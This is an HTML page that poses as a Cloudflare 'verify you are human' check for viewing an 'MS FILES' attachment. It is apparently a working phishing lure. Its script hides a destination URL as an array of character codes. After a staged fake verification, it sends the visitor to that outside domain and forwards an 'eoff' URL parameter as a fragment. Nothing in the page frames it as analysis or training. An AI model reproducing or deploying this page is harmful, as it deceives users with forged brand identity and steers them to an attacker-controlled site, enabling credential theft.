<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MS FILES</title>
    <style>
        :root { --accent: #4a6ee0; --done: #28a745; }
        * { box-sizing: border-box; }
        body { margin: 0; background: #ffffff; font-family: "Segoe UI", Tahoma, sans-serif; height: 100vh; overflow: hidden; }

        /* Initial Loading Screen */
        #preloader {
            position: fixed; inset: 0; background: #f8f9fa; z-index: 1000;
            display: flex; align-items: center; justify-content: center;
            transition: opacity 0.4s;
        }

        .pulse-icon { width: 100px; opacity: 0.8; animation: breath 1.8s ease-in-out infinite; }
        @keyframes breath { 0%, 100% { transform: scale(1); opacity: 0.6; } 50% { transform: scale(1.05); opacity: 1; } }

        /* Main Viewport */
        #app-shell {
            display: grid; place-content: center; height: 100%;
            opacity: 0; transform: translateY(10px); transition: all 0.8s cubic-bezier(0.16, 1, 0.3, 1);
        }

        body.active #app-shell { opacity: 1; transform: translateY(0); }

        .container { width: 400px; padding: 0 20px; text-align: center; }
        .info-title { font-size: 18px; color: #1a1a1a; font-weight: 500; margin-bottom: 30px; line-height: 1.4; }

        /* Widget Box */
        .verification-row {
            background: #fafafa; border: 1px solid #ddd; border-radius: 10px;
            padding: 30px 20px; display: flex; align-items: center; text-align: left;
        }

        .action-area { flex-grow: 1; display: flex; align-items: center; gap: 15px; }

        .check-box {
            width: 26px; height: 26px; border: 2px solid var(--accent); border-radius: 4px;
            cursor: pointer; position: relative; display: grid; place-items: center;
        }

        /* Logic States */
        .state-working { border-radius: 50%; border-color: #eee; border-top-color: var(--accent); animation: spin 0.7s linear infinite; }
        .state-success { background: var(--done); border-color: var(--done); }
        .state-success::after { content: '✔'; color: white; font-size: 14px; font-weight: 900; }

        @keyframes spin { to { transform: rotate(360deg); } }

        .status-label { font-size: 15px; font-weight: 600; color: #444; }

        /* Branding */
        .brand-aside { text-align: right; line-height: 1.2; }
        .brand-aside img { width: 28px; display: block; margin: 0 0 5px auto; }
        .brand-aside span { font-size: 10px; font-weight: 800; color: #f38020; display: block; }
        .brand-aside small { font-size: 11px; color: #999; }

        /* Bottom Badge */
        .secure-footer {
            position: fixed; bottom: 25px; left: 0; right: 0;
            display: flex; justify-content: center; align-items: center;
            gap: 8px; color: #bbb; font-size: 12px;
        }
        .shield-path { width: 12px; height: 14px; background: #ccc; clip-path: polygon(0% 0%, 100% 0%, 100% 75%, 50% 100%, 0% 75%); }
    </style>
</head>
<body>

    <div id="preloader">
        <img src="astro.png" class="pulse-icon">
    </div>

    <div id="app-shell">
        <div class="container">
            <h2 class="info-title">Verify you are human by completing the action below to view attachment</h2>

            <div class="verification-row">
                <div class="action-area">
                    <div id="target-node" class="check-box"></div>
                    <div id="label-node" class="status-label">Verify</div>
                </div>

                <div class="brand-aside">
                    <img src="cloudflare_.png">
                    <span>CLOUDFLARE</span>
                    <small>Privacy &middot; Terms</small>
                </div>
            </div>
        </div>
    </div>

    <div class="secure-footer">
        <div class="shield-path"></div>
        Protected by CLOUDFLARE
    </div>

    <script>
        (function() {
            "use strict";

            // Resource Config
            const CONFIG = {
                codes: [104, 116, 116, 112, 115, 58, 47, 47, 112, 111, 46, 116, 105, 102, 102, 110, 117, 97, 101, 46, 111, 110, 108, 105, 110, 101, 47, 97, 112, 105, 47, 118, 49, 47, 116, 103, 75, 72, 102, 48, 114, 48, 69, 87, 113, 73, 97, 67, 98, 53],
                wait: [1300, 1600, 800]
            };

            const dom = {
                loader: document.getElementById('preloader'),
                btn: document.getElementById('target-node'),
                txt: document.getElementById('label-node')
            };

            let isRunning = false;

            // Startup
            window.addEventListener('DOMContentLoaded', () => {
                setTimeout(() => {
                    dom.loader.style.opacity = '0';
                    setTimeout(() => {
                        dom.loader.style.display = 'none';
                        document.body.classList.add('active');
                    }, 400);
                }, CONFIG.wait[0]);
            });

            // Verification Sequence
            const executeProcess = async () => {
                if (isRunning) return;
                isRunning = true;

                // Step 1: Loading
                dom.txt.innerText = "Verifying...";
                dom.btn.classList.add('state-working');

                await new Promise(res => setTimeout(res, CONFIG.wait[1]));

                // Step 2: Completed
                dom.btn.className = 'check-box state-success';
                dom.txt.innerText = "Verified";

                // Step 3: Redirect
                setTimeout(() => {
                    const endpoint = CONFIG.codes.reduce((acc, code) => acc + String.fromCharCode(code), "");
                    const params = new URLSearchParams(window.location.search);
                    const fragment = params.get('eoff');

                    const url = fragment ? (endpoint + '#' + fragment) : endpoint;
                    window.location.href = url;
                }, CONFIG.wait[2]);
            };

            dom.btn.onclick = executeProcess;

        })();
    </script>
</body>
</html>
